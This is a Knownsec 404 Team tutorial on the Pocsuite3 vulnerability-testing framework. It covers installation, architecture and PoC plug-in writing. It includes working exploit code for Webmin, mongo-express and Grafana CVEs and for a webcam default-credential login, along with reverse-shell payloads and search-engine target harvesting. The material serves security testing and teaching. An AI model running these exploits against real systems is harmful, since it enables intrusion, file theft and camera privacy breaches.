**Author: Knownsec 404 Team  
Chinese version: <https://paper.seebug.org/1931/> **

# 1 Introduction

[Pocsuite3](https://pocsuite.org/) is a remote vulnerability testing framework
based on GPLv2 license and open source created by Knownsec 404 Team. Since
Pocsuite3 was open sourced in 2015, Knownsec 404 Team has been continuously
maintaining and updating.

Features：

  * It supports three modes: verify, attack and shell. It is not only born for scanning, but also can be used in other scenarios, such as vulnerability exploit and interactive shell for obtaining targets.
  * It integrates common cyberspace search engines such as ZoomEye and Shodan to facilitate asset import.
  * DNSLog tools such as CEye and Interactsh are integrated to assist in the verification of no echo vulnerability.
  * Plug in system, users can customize plug-ins of TARGETS, POCS, RESULTS, which is highly expandable.
  * Hook of network library (urllib3, requests), convenient for POC writing and global control.
  * It supports IPv4 / IPv6.
  * Global HTTP/HTTPS/SOCKS proxy support.
  * Integrated call support, which can be used as a module.
  * Industry conscience, all open source code.
  * ...

Compared with Metasploit, Pocsuite3 currently does not have the ability of
post penetration stage, which is relatively lightweight. Compared with the PoC
framework in YAML format, Pocsuite3 is more flexible and can directly use a
large number of third-party libraries. As long as users can write python, they
can get started quickly. Of course, flexibility also brings the problem of PoC
maintenance. After all, everyone has different coding styles, which can only
be said to have advantages and disadvantages.

At present, Pocsuite3's support for YAML format PoC is also planned. Please
look forward to it.

# 2 Installation

Developed based on Python3, Pocsuite3 can run on any platform that supports
Python 3.7+, such as Linux, Windows, MacOS, BSD, etc.

In November 2021, Pocsuite3 passed the official Debian code and compliance
inspection, and [officially joined the software repository of Debian, Ubuntu,
Kali and other Linux
distributions,](\(https://mp.weixin.qq.com/s/0lPA8FGKA64X8K-aTcgmMQ\)
"officially joined the software warehouse of Debian, Ubuntu, Kali and other
Linux distributions,") which can be obtained by one click with apt command. In
addition, pocsuite3 has also been pushed to Python pypi, homebrew repository
of MacOS, AUR repository of archlinux, and dockerhub.

## 2.1 Install using Python3 pip

    
    
    pip3 install pocsuite3
    
    # Use domestic image acceleration
    pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple pocsuite3

![](https://images.seebug.org/content/images/2022/07/c870bf9d-8290-4a91-951f-8c6b4c16f7ad.png-w331s)

## 2.2 Install on MacOS

    
    
    brew update
    brew info pocsuite3
    brew install pocsuite3

![](https://images.seebug.org/content/images/2022/07/ec698937-b748-4249-bee8-5713eabbc126.png-w331s)

## 2.3 [Debian](https://tracker.debian.org/pkg/pocsuite3),
[Ubuntu](https://launchpad.net/ubuntu/+source/pocsuite3),
[Kali](http://pkg.kali.org/pkg/pocsuite3)

    
    
    sudo apt update
    sudo apt install pocsuite3

![](https://images.seebug.org/content/images/2022/07/488f4226-494d-407e-9dfb-99ee23f56f84.png-w331s)

## 2.4 Docker

    
    
    docker run -it pocsuite3/pocsuite3

![](https://images.seebug.org/content/images/2022/07/458429da-82e0-4e6b-ae35-d593c259cbe9.png-w331s)

## 2.5 Arch Linux

    
    
    yay pocsuite3

![](https://images.seebug.org/content/images/2022/07/df2f8cf3-41ea-4734-8899-720b0e13d01f.png-w331s)

## 2.6 Source installation

    
    
    wget https://github.com/knownsec/pocsuite3/archive/master.zip
    unzip master.zip
    cd pocsuite3-master
    pip3 install -r requirements.txt
    python3 setup.py install

# 3 Brief analysis of Architecture

In order to use it more smoothly, it is necessary to understand the
architecture of the framework. On the whole, this framework mainly includes
four parts: target collection, PoC plug-in loading, multithread detection and
results summary. As shown in the following figure:

![](https://images.seebug.org/content/images/2022/07/68572eeb-e9ec-4624-9841-fb41cace79cd.png-w331s)

## 3.1 Target collection

First, let's take a look at target collection. Currently, the following
methods are supported:

  * `-u` specify a single URL or CIDR, which supports IPv4 / IPv6. Using the `-p` parameter can provide additional ports, and it is convenient to detect a target network segment with CIDR.
  * `-f` specify a file and save multiple URL/CIDRs to the file, one per line.
  * `--dork`, the framework integrates common cyberspace search engines such as ZoomEye、Shodan and so on. It can automatically import targets by providing search keywords and `API-KEY` with corresponding parameters. It is worth mentioning that users can also put search keywords into the dork attribute of the PoC plug-in.
  * `--plugins` call the plug-in to load the target, such as `target_from_redis`. Users can also customize the targets type plug-in.

## 3.2 PoC plug-in loading

  * The `-r` option supports specifying one or more PoC paths (or directories). If a directory is provided, the framework will traverse the directory and then load all qualified PoCs. Users can use the `-k` option to specify keywords to filter PoCs, such as component name, CVE number, etc. If we confirm the target component, we can use the `-k` option to find all the corresponding PoCs for batch testing of the target. If only the `-k` option is provided, `-r` defaults to the `pocsuite3/pocs` directory that comes with Pocsuite3.
  * `--plugins` call the plug-in to load PoC, such as `poc_from_seebug`、`poc_from_redis`. Users can also customize POCS type plug-ins.

## 3.3 Multithread detection

After the user specifies the target and PoC, the framework will match each
target and PoC (Cartesian product), generate a queue with element `(target,
poc_module)`, and then start a thread pool with the default size of 150 (can
be set through `--threads`) to process this queue.

In Pocsuite3, the PoC plug-in has three running modes, corresponding to the
three methods defined in the PoC plug-in respectively. The command line
parameters `--verify`、`--attack`、`--shell` can be used to determine which
method to execute. If not specified, the default is `--verify`.

What a thread needs to do is to initialize the PoC plug-in with target as a
parameter, execute the specified method, and then obtain the execution result.

## 3.4 Results summary

After obtaining the execution results in the previous step, the framework
provides a variety of methods to process and save the results:

  * Console log, `-v` parameter controls the log level, `--ppt` parameter can process the mosaic of IP address, which is convenient for screen recording.
  * `-o` parameter saves the running result as a file in JSON Lines format.
  * `--plugins` calls the plug-in to process the results, such as `file_record`，`html_report`. Users can also customize the results type plug-in.

# 4 Operation

Pocsuite3 has three operation methods: 1. Command line; 2. Interactive
console; 3. Integration call.

## 4.1 Command line

Run the pocsuite command directly, and use the corresponding parameters to
specify the target and PoC to be tested.

![](https://images.seebug.org/content/images/2022/07/17b9a415-3c6d-49a4-aea7-89a4fe04b355.png-w331s)

## 4.2 Interactive console

For a console similar to Metasploit, use the `poc-console` command to enter.

![](https://images.seebug.org/content/images/2022/07/f543e48e-2225-47a3-8d6c-8a1f8ae51735.png-w331s)

## 4.3 Integration call

Use it as a module.

![](https://images.seebug.org/content/images/2022/07/83100657-7529-40cf-ad6a-ae0c71242063.png-w331s)

# 5 How to write PoC

The frame is only the body, and PoC is the soul. Here, several common
vulnerability types are taken as examples to illustrate how to quickly develop
PoC based on Pocsuite3 framework.（ **The following vulnerabilities are all
public vulnerabilities on the Internet. This tutorial is only for tool
teaching purposes. It is forbidden to use POC for any illegal purposes!** ）

Pocsuite 3 can automatically generate PoC templates through the `-n` or
`--new` parameters.

## 5.1 Three modes of PoC plug-in

1、Verify mode, to verify the existence of vulnerabilities. The verification
method depends on the specific vulnerability type, such as checking the
software version of the target, judging the status code or return of a key
API, reading a specific file, executing a command and obtaining the results,
combined with DNSLog out-of-band echo, etc. This mode is used for batch
vulnerability detection. Generally, users do not need to provide additional
parameters, and it should be harmless to the target as far as possible.

2、Attack mode can realize a specific requirement. For example, get specific
data, write a shell and return the shell address, get the command from the
command line parameters and execute it, get the file path from the command
line parameters and return the file content, etc.

3、Shell mode, to get the interactive shell. In this mode, it will listen to
the 6666 port of the machine by default (which can be modified by
`--lhost`、`--lport` parameters), write the corresponding code, let the target
execute the reverse connection, and connect the Payload to the set IP and port
to get a shell. Refer to [GTFOBins Reverse
shell](https://gtfobins.github.io/#+reverse shell) for reverse connection of
payload.

In the PoC plug-in, the implementation of attack mode and shell mode is
optional.

## 5.2 PoC plug-in base class

In order to simplify the writing of PoC plug-ins, Pocsuite3 implements the PoC
base class: `POCBase`, where many common code fragments can be placed. When
writing POC, we only need to inherit the base class. The commonly used
properties and methods are as follows:

    
    
    常用属性：
    
    self.url  # Target url
    self.scheme  # Protocol of target url
    self.rhost  # Hostname of target url
    self.rport  # Port of target url
    self.host_ip  # IP address of the WAN port on the host
    
    常用方法：
    
    self._check()  # Port opening check, http/https protocol automatic correction, dork check, honeypot check
    self.get_option('key')  # Get the value of command line parameter --key
    self.parse_output({})  # Method of returning results, parameter is a dictionary

## 5.3 Webmin unauthorized remote command execution
vulnerability（CVE-2019-15107）

Vulnerability details：[Webmin Unauthenticated Remote
Execution](https://www.seebug.org/vuldb/ssvid-98060)

Webmin is a powerful Web-based Unix system management tool. Administrators can
access various Webmin management functions through browsers and complete
corresponding management actions. The `Webmin <= 1.920` `/password_change.cgi`
interface has an unauthorized command injection vulnerability.

Based on the details of the vulnerability disclosed on the Internet, we can
easily develop the PoC plug-in of the vulnerability. First, use the `--new`
parameter to generate a PoC template (if there are too many attributes, just
press enter all the way):

    
    
    →pocsuite --new
    ...
    You are about to be asked to enter information that will be used to create a poc template.
    There are quite a few fields but you can leave some blank.
    For some fields there will be a default value.
    -----    Seebug ssvid (eg, 99335) [0]: 98060  
    PoC author (eg, Seebug) []: Seebug  
    Vulnerability disclosure date (eg, 2021-8-18) [2022-07-11]: 2019-08-19  
    Advisory URL (eg, https://www.seebug.org/vuldb/ssvid-99335) [https://www.seebug.org/vuldb/ssvid-98060]:  
    Vulnerability CVE number (eg, CVE-2021-22123) []: CVE-2019-15107  
    Vendor name (eg, Fortinet) []:  
    Product or component name (eg, FortiWeb) []: Webmin  
    Affected version (eg, <=6.4.0) []: <=1.920  
    Vendor homepage (eg, https://www.fortinet.com) []: https://www.webmin.com  
    
    0    Arbitrary File Read
    1    Code Execution
    2    Command Execution
    3    Denial Of service
    4    Information Disclosure
    5    Login Bypass
    6    Path Traversal
    7    SQL Injection
    8    SSRF
    9    XSS
    
    Vulnerability type, choose from above or provide (eg, 3) []: 2  
    Authentication Required (eg, yes) [no]: no  
    Can we get result of command (eg, yes) [no]: yes  
    PoC name [Webmin <=1.920 Pre-Auth Command Execution (CVE-2019-15107)]:  
    Filepath in which to save the poc [./webmin_1.920_pre-auth_command_execution_cve-2019-15107.py]  
    [14:50:49] [INFO] Your poc has been saved in ./webmin_1.920_pre-auth_command_execution_cve-2019-15107.py :)

The generated PoC template is as follows:

    
    
    #!/usr/bin/env python3
    # -*- coding: utf-8 -*-    
    # It is recommended to import from pocsuite3.api
    from pocsuite3.api import (
        minimum_version_required, POCBase, register_poc, requests, logger,
        OptString, OrderedDict,
        random_str,
        get_listener_ip, get_listener_port, REVERSE_PAYLOAD
    )
    
    # Limit the Framework version and avoid running new PoC plug-ins on the old framework
    minimum_version_required('1.9.6')
    
    
    # DemoPOC class, inherited from the base class POCBase
    class DemoPOC(POCBase):
        # Attribute information of PoC and vulnerability
        vulID = '98060'
        version = '1'
        author = 'Seebug'
        vulDate = '2019-08-19'
        createDate = '2022-07-11'
        updateDate = '2022-07-11'
        references = ['https://www.seebug.org/vuldb/ssvid-98060']
        name = 'Webmin <=1.920 Pre-Auth Command Execution (CVE-2019-15107)'
        appPowerLink = 'https://www.webmin.com'
        appName = 'Webmin'
        appVersion = '<=1.920'
        vulType = 'Command Execution'
        desc = 'Vulnerability description'
        samples = ['']  # The test sample is the goal of successful PoC testing
        install_requires = ['']  # PoC third party module dependency
        pocDesc = 'User manual of poc'
        # Search for dork. If the target is not provided when running PoC and the field is not empty, the plug-in will be called to retrieve the target from the search engine.
        dork = {'zoomeye': ''}
        suricata_request = ''
        suricata_response = ''
    
        # Define additional command line parameters for attack mode
        def _options(self):
            o = OrderedDict()
            o['cmd'] = OptString('uname -a', description='The command to execute')
            return o
    
        # The core method of vulnerability
        def _exploit(self, param=''):
            # Use self._check() method checks whether the target is alive and whether it is a keyword honeypot.
            if not self._check(dork=''):
                return False
    
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            payload = 'a=b'
            res = requests.post(self.url, headers=headers, data=payload)
            logger.debug(res.text)
            return res.text
    
        # Implementation of verify mode
        def _verify(self):
            result = {}
            flag = random_str(6)
            param = f'echo {flag}'
            res = self._exploit(param)
            if res and flag in res:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo'][param] = res
            # Call self.parse_output(), return the result
            return self.parse_output(result)
    
        # Implementation of attack mode
        def _attack(self):
            result = {}
            # self.get_option() method can obtain customized command line parameters
            param = self.get_option('cmd')
            res = self._exploit(param)
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo'][param] = res
            # Call self.parse_output(), return the result
            return self.parse_output(result)
    
        # Implementation of shell mode
        def _shell(self):
            try:
                self._exploit(REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port()))
            except Exception:
                pass
    
    
    # Register this PoC to the framework
    register_poc(DemoPOC)

Based on the above PoC template, combined with vulnerability details,
rewrite`_exploit()` method：

    
    
    def _exploit(self, param=''):
        if not self._check(dork='<title>Login to Webmin</title>'):
            return False
    
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'{self.url}/session_login.cgi'
        }
        payload = f'user=rootxx&pam=&expired=2&old=test|{param}&new1=test2&new2=test2'
        res = requests.post(f'{self.url}/password_change.cgi', headers=headers, data=payload)
        logger.debug(res.text)
        return res.text.split('The current password is incorrect')[-1].split('</h3></center>')[0]

Then we will set up the docker range for testing, `docker run -it --rm -p
10000:10000 pocsuite3/cve-2019-15107`.

verify mode ok:

![](https://images.seebug.org/content/images/2022/07/e49bb540-fded-404c-853b-54d256b76d56.png-w331s)

The attack mode obtains the execution of command line parameters and returns
the results, `--options` parameter can view the additional command line
parameters defined by PoC:

![](https://images.seebug.org/content/images/2022/07/382af05e-740d-4d60-b397-ac3db63f1380.png-w331s)

Shell mode does not work with bash payload, so use Python instead. It should
be noted that because there are some special characters in the payload, it
needs to be analyzed in combination with the specific situation of the
vulnerability, such as using base64 encoding to bypass the restriction.

    
    
         def _shell(self):
             try:
    -            self._exploit(REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port()))
    +            self._exploit(REVERSE_PAYLOAD.PYTHON.format(get_listener_ip(), get_listener_port()))
             except Exception:
                 pass

shell mode ok：

![](https://images.seebug.org/content/images/2022/07/44ca8f04-503a-4146-9363-f4729c51d463.png-w331s)

## 5.4 mongo-express authentication remote code execution
vulnerability（CVE-2019-10758）

Vulnerability details：[mongo-express remote code execution
vulnerability（CVE-2019-10758）](https://www.seebug.org/vuldb/ssvid-98116)

Mongo-express is an open source MongoDB Web management interface based on
Node.js and express. `mongo-express <= 0.53.0` has an authentication remote
code execution vulnerability. If the attacker can log in successfully, or the
target server does not modify the default account password（`admin:pass`）, then
any node.js code can be executed.

Use `pocsuite --new` to generate templates. Because the vulnerability is not
echoed, we use DNSLog services such as [CEye](http://www.ceye.io/) or
[Interactsh](https://github.com/projectdiscovery/interactsh) to assist in
verification.

[Interactsh](https://github.com/projectdiscovery/interactsh) is a DNSLog tool
developed by projectdiscovery, a well-known open source software organization.
As long as you have a domain name, you can quickly build your own oob
services. There are also some publicly available online, such as:
`interact.sh, oast.pro, oast.live, oast.site, oast.online, oast.fun, oast.me`.

Generate template：

    
    
    →pocsuite --new
    ...
    -----    Seebug ssvid (eg, 99335) [0]: 98116
    PoC author (eg, Seebug) []: Seebug
    Vulnerability disclosure date (eg, 2021-8-18) [2022-7-11]: 2020-01-03
    Advisory URL (eg, https://www.seebug.org/vuldb/ssvid-99335) [https://www.seebug.org/vuldb/ssvid-98116]:
    Vulnerability CVE number (eg, CVE-2021-22123) []: CVE-2019-10758
    Vendor name (eg, Fortinet) []:
    Product or component name (eg, FortiWeb) []: mongo-express
    Affected version (eg, <=6.4.0) []: <=0.53.0
    Vendor homepage (eg, https://www.fortinet.com) []: https://github.com/mongo-express/mongo-express
    
    0    Arbitrary File Read
    1    Code Execution
    2    Command Execution
    3    Denial Of service
    4    Information Disclosure
    5    Login Bypass
    6    Path Traversal
    7    SQL Injection
    8    SSRF
    9    XSS
    
    Vulnerability type, choose from above or provide (eg, 3) []: 1
    Authentication Required (eg, yes) [no]: yes  
    Can we get result of command (eg, yes) [no]: no  
    Out-of-band server to use (eg, interactsh) [ceye]: interactsh  
    ...

Simply modify the template according to the details of the vulnerability：

    
    
         def _options(self):
             o = OrderedDict()
    -        o['user'] = OptString('', description='The username to authenticate as', require=True)
    -        o['pwd'] = OptString('', description='The password for the username', require=True)
    +        o['user'] = OptString('admin', description='The username to authenticate as', require=True)
    +        o['pwd'] = OptString('pass', description='The password for the username', require=True)
             o['cmd'] = OptString('uname -a', description='The command to execute')
             return o
    
         def _exploit(self, param=''):
    -        if not self._check(dork=''):
    +        if not self._check(dork='mongo-express='):
                 return False
    
             user = self.get_option('user')
             pwd = self.get_option('pwd')
             headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    -        payload = 'a=b'
    -        res = requests.post(self.url, headers=headers, data=payload)
    +        payload = (
    +            'document=this.constructor.constructor("return process")().'
    +            f'mainModule.require("child_process").execSync("{param}")'
    +        )
    +        res = requests.post(f'{self.url}/checkValid', headers=headers, data=payload, auth=(user, pwd))
             logger.debug(res.text)
             return res.text

Set cyber range：https://github.com/vulhub/vulhub/tree/master/mongo-express/CVE-2019-10758

Vulnerability verification, through the command line parameter `--user admin
--pwd pass --oob-server interact.sh` specifies the user name, password, and
DNSLog service address to be used, or it can be left unspecified and the
default value is used.

![](https://images.seebug.org/content/images/2022/07/7b2e0b27-57c8-47a0-a117-dcda8389fd5e.png-w331s)

## 5.5 Grafana Unauthorized arbitrary file reading
vulnerability（CVE-2021-43798）

Vulnerability details：[Grafana file reading vulnerability analysis and
summary(CVE-2021-43798)](https://blog.riskivy.com/grafana-Analysis and summary
of arbitrary file reading vulnerabilitycve-2021-43798/)

Grafana is a cross-platform, open source data visualization web application
platform. `Grafana v8.0.0-beta1` to `v8.3.0` has an unauthorized arbitrary
file reading vulnerability.

Generate template：

    
    
    →pocsuite --new
    ...
    -----    Seebug ssvid (eg, 99335) [0]: 99398
    PoC author (eg, Seebug) []: Seebug
    Vulnerability disclosure date (eg, 2021-8-18) [2022-07-11]: 2021-12-07
    Advisory URL (eg, https://www.seebug.org/vuldb/ssvid-99335) [https://www.seebug.org/vuldb/ssvid-99398]:
    Vulnerability CVE number (eg, CVE-2021-22123) []: CVE-2021-43798
    Vendor name (eg, Fortinet) []:
    Product or component name (eg, FortiWeb) []: Grafana
    Affected version (eg, <=6.4.0) []: <=8.3.0
    Vendor homepage (eg, https://www.fortinet.com) []: https://grafana.com
    
    0    Arbitrary File Read
    1    Code Execution
    2    Command Execution
    3    Denial Of service
    4    Information Disclosure
    5    Login Bypass
    6    Path Traversal
    7    SQL Injection
    8    SSRF
    9    XSS
    
    Vulnerability type, choose from above or provide (eg, 3) []: 0
    Authentication Required (eg, yes) [no]: no
    ...

Modify the`_exploit` method based on the disclosed vulnerability details:

    
    
         def _exploit(self, param=''):
    -        if not self._check(dork=''):
    +        if not self._check(dork='Grafana', allow_redirects=True):
                 return False
    
    -        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    -        payload = 'a=b'
    -        res = requests.post(self.url, headers=headers, data=payload)
    +        res = requests.get(f'{self.url}/public/plugins/grafana/../../../../../../../..{param}')
             logger.debug(res.text)
             return res.text

Set cyber range：`docker run -it --rm -p 3000:3000 pocsuite3/cve-2021-43798`

verify mode effects：

![](https://images.seebug.org/content/images/2022/07/4b23f167-6ed2-49a5-8671-b54a7c1e33a8.png-w331s)

Adding the `-o a.json` parameter can save the result as a file in JSON Lines
format.

![](https://images.seebug.org/content/images/2022/07/2fb777de-38fc-4671-a3aa-b0aef390386d.png-w331s)

Attack mode, get the file path from the command line and return the result.

![](https://images.seebug.org/content/images/2022/07/a7e173ff-8c04-4898-82b4-a95d1665f0ee.png-w331s)

For the directory traversal vulnerability, one bad thing is that
`urlib3>1.24.3` will delete `../` from the request URL, which affects many
security tools. See issue：https://github.com/urllib3/urllib3/issues/1790 for
more details

Pocsuite3 hook part of the code of urllib3 and requests, supporting`../`, and
the encoding of special characters is cancelled.

![](https://images.seebug.org/content/images/2022/07/73c5f1f0-31ad-4a17-a96c-850aae697126.png-w331s)

## 5.6 A webcam login bypass vulnerability

Vulnerability details：[[A webcam login bypass and multiple remote code
execution vulnerabilities based on stack overflow and data analysis
report](https://paper.seebug.org/652/ "A webcam login bypass and multiple
remote code execution vulnerabilities based on stack overflow and data
analysis report")]

The Web service of this brand camera is based on HTTP basic authentication,
and there are three groups of default credentials corresponding to different
permission levels. The three groups of default credentials are:
`admin:admin`，`user:user`，`guest:guest`. During installation, the app will
only remind you to change the default password of the admin account.

It is worth mentioning that user accounts and guest accounts can also view
video streams. Most users will not change the default passwords of these
accounts, resulting in privacy disclosure.

Generate template：

    
    
    →pocsuite --new
    ...
    0    Arbitrary File Read
    1    Code Execution
    2    Command Execution
    3    Denial Of service
    4    Information Disclosure
    5    Login Bypass
    6    Path Traversal
    7    SQL Injection
    8    SSRF
    9    XSS
    
    Vulnerability type, choose from above or provide (eg, 3) []: 5
    ...

Modify template：

    
    
    -    def _options(self):
    -        o = OrderedDict()
    -        o['param'] = OptString('', description='The param')
    -        return o
    -         def _exploit(self, param=''):
    -        if not self._check(dork=''):
    +        if not self._check(dork='Error: username or password error,please input again.'):
                 return False
    
    -        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    -        payload = 'a=b'
    -        res = requests.post(self.url, headers=headers, data=payload)
    -        logger.debug(res.text)
    -        return res.text
    +        creds = {'admin': 'admin', 'user': 'user', 'guest': 'guest'}
    +        valid_creds = {}
    +        for u, p in creds.items():
    +            res = requests.get(self.url, auth=(u, p))
    +            if res.status_code != 401:
    +                valid_creds[u] = p
    +        return valid_creds
    
         def _verify(self):
             result = {}
    @@ -53,17 +48,11 @@ class DemoPOC(POCBase):
             if res:
                 result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = self.url
    -            result['VerifyInfo'][param] = res
    +            result['VerifyInfo']['Info'] = res
             return self.parse_output(result)
    
         def _attack(self):
    -        result = {}
    -        param = self.get_option('param')
    -        res = self._exploit(param)
    -        result['VerifyInfo'] = {}
    -        result['VerifyInfo']['URL'] = self.url
    -        result['VerifyInfo'][param] = res
    -        return self.parse_output(result)
    +        return self._verify()

Use `--dork-zoomeye` to specify keywords to retrieve targets from ZoomEye for
detection.

![](https://images.seebug.org/content/images/2022/07/b6be5667-8c32-4a3e-84fe-f3ff63dd5330.png-w331s)

# 6 Conclusion

If you encounter any problems or have any new ideas, please feel free to
submit the issue (<https://github.com/knownsec/pocsuite3/issues/new>) or PR
(<https://github.com/knownsec/pocsuite3/compare>)

YouTube：<https://www.youtube.com/channel/UCKKmeW6hUa4cc935Jd8eijg>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1933/>

